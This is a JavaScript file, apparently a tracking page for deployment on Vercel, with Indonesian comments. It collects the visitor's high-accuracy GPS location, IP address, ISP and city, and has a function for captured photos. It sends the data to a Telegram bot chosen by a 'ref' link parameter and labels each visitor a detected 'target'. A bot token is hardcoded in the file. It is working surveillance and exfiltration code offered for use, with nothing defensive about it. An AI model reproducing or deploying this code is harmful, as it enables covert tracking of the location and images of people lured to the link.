// script.js (Upload ke Vercel)
const urlParams = new URLSearchParams(window.location.search);
const chatId = urlParams.get('ref'); // ID Admin yang membuat link
const botToken = "8556917932:AAG6ZjgdxqrMl74xBiZmw4Ol5MuIlrlSGSg"; // Harus sama dengan di bot

// Fungsi untuk mendapatkan data IP dan ISP yang detail
async function getIPDetails() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            ip: data.ip || "Tidak diketahui",
            isp: data.org || "Tidak diketahui",
            city: data.city || "Tidak diketahui",
            region: data.region || "Tidak diketahui"
        };
    } catch (error) {
        return { ip: "Error", isp: "Error", city: "Error", region: "Error" };
    }
}

// Fungsi utama mengambil lokasi dengan AKURASI TINGGI
function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition, showError, {
            enableHighAccuracy: true, // WAJIB: Agar lokasi lebih akurat (GPS)
            timeout: 10000,           // Menunggu maksimal 10 detik
            maximumAge: 0             // Jangan gunakan lokasi lama yang tersimpan di cache
        });
    } else {
        alert("Geolocation tidak didukung oleh browser ini.");
    }
}

async function showPosition(position) {
    const lat = position.coords.latitude;
    const lon = position.coords.longitude;
    const acc = position.coords.accuracy; // Mengetahui tingkat akurasi dalam meter
    const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
    
    // Ambil data IP & ISP
    const ipData = await getIPDetails();
    
    // Kirim ke Telegram
    await sendToTelegram(mapsUrl, ipData, acc);
}

async function sendToTelegram(mapsUrl, ipData, accuracy) {
    const urlParams = new URLSearchParams(window.location.search);
    const chatId = urlParams.get('ref');
    const botToken = "8556917932:AAG6ZjgdxqrMl74xBiZmw4Ol5MuIlrlSGSg"; //

    const message = `
📍 **TARGET TERDETEKSI (AKURASI TINGGI)**
━━━━━━━━━━━━━━━━━━━━
🌐 **IP Address:** \`${ipData.ip}\`
🏢 **ISP/Provider:** \`${ipData.isp}\`
🏙️ **Kota/Wilayah:** \`${ipData.city}, ${ipData.region}\`
🎯 **Akurasi:** \`± ${Math.round(accuracy)} meter\`

📍 **Google Maps:**
${mapsUrl}
━━━━━━━━━━━━━━━━━━━━`;

    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            chat_id: chatId, 
            text: message, 
            parse_mode: "Markdown" 
        })
    });
}

// Fungsi kirim foto otomatis
async function sendPhotoToTelegram(base64Data) {
    const blob = await (await fetch(base64Data)).blob();
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', blob, 'capture.jpg');
    formData.append('caption', '📸 **TARGET TERDETEKSI!**');

    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: formData
    });
}